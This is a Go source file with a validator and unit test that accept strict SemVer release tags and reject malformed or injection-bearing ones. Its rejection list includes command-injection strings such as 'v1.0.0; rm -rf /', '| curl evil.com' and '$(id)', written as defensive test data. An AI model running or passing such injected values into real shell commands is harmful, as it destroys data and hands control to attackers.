package core

import (
	"regexp"
	"strings"
	"testing"
)

// ReleaseVersionRegex defines the strict SemVer 2.0.0 allowlist grammar with mandatory 'v' prefix [Phase 1, Follow-up Point 4]:
// - Major, Minor, Patch: non-negative integers without leading zeros: (0|[1-9][0-9]*)
// - Pre-release: optional hyphen followed by dot-separated identifiers where:
//   - Numeric identifiers MUST NOT have leading zeroes: (0|[1-9][0-9]*)
//   - Alphanumeric identifiers MUST contain at least one non-digit: ([0-9A-Za-z-]*[A-Za-z-][0-9A-Za-z-]*)
//
// - Build metadata (+...) is intentionally excluded from allowable Git release tags for security and immutability.
// - Rejects all shell metacharacters, whitespace, control chars, path traversals, and leading zeros.
var ReleaseVersionRegex = regexp.MustCompile(`^v(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)(-((0|[1-9][0-9]*|[0-9A-Za-z-]*[A-Za-z-][0-9A-Za-z-]*)(\.(0|[1-9][0-9]*|[0-9A-Za-z-]*[A-Za-z-][0-9A-Za-z-]*))*))?$`)

// ValidateReleaseVersionString checks release version string compliance against injection and malformed formats
func ValidateReleaseVersionString(ver string) bool {
	trimmed := strings.TrimSpace(ver)
	if trimmed == "" || len(ver) > 64 {
		return false
	}
	// Reject leading dash, slashes, backticks, shell metacharacters
	if strings.HasPrefix(ver, "-") || strings.ContainsAny(ver, " /\\;`$|&><\n\r\t\"'") {
		return false
	}
	return ReleaseVersionRegex.MatchString(ver)
}

func TestReleaseVersionValidation(t *testing.T) {
	validVersions := []string{
		"v3.2.1-alpha",
		"v1.0.0",
		"v0.1.0-beta.1",
		"v2.0.0-rc1",
		"v10.20.30",
		"v0.0.1",
		"v1.2.3-alpha-1.2",
		"v1.2.3-0",        // SemVer 2.0.0: numeric '0' has no leading zero (VALID)
		"v1.2.3-alpha.0",  // SemVer 2.0.0: numeric '0' after dot (VALID)
		"v1.2.3-alpha.1",  // SemVer 2.0.0: numeric '1' without leading zero (VALID)
		"v1.2.3-alpha-01", // SemVer 2.0.0: contains hyphen, treated as alphanumeric identifier (VALID)
		"v1.2.3-rc.1.2.3",
	}

	for _, v := range validVersions {
		if !ValidateReleaseVersionString(v) {
			t.Errorf("Expected valid SemVer tag '%s' to be accepted", v)
		}
	}

	invalidVersions := []string{
		"",
		"   ",
		"v1.2.3-01",        // SemVer 2.0.0 Spec 9: Numeric prerelease identifier MUST NOT include leading zeroes
		"v1.2.3-alpha.01",  // SemVer 2.0.0 Spec 9: Numeric identifier with leading zero rejected
		"v1.2.3-alpha.000", // SemVer 2.0.0 Spec 9: Multiple zeros rejected
		"v01.0.0",          // leading zero in major
		"v1.02.0",          // leading zero in minor
		"v1.2.03",          // leading zero in patch
		"v1.0.0-",          // trailing hyphen without pre-release label
		"v1.0.0-alpha..1",  // consecutive dots in pre-release
		"v1.2.3+20130313",  // build metadata excluded by policy
		"v1.0.0; rm -rf /",
		"v1.0.0 && id",
		"v1.0.0 | curl evil.com",
		"$(id)",
		"v1.0.0`id`",
		"-v1.0.0",
		"1.0.0", // missing leading 'v'
		"v1.0/0",
		"v1..0",
		"v1.0.0\necho hacked",
		"v1.0.0\t--dangerous",
	}

	for _, v := range invalidVersions {
		if ValidateReleaseVersionString(v) {
			t.Errorf("Expected injection/malformed version '%s' to be rejected", v)
		}
	}
}
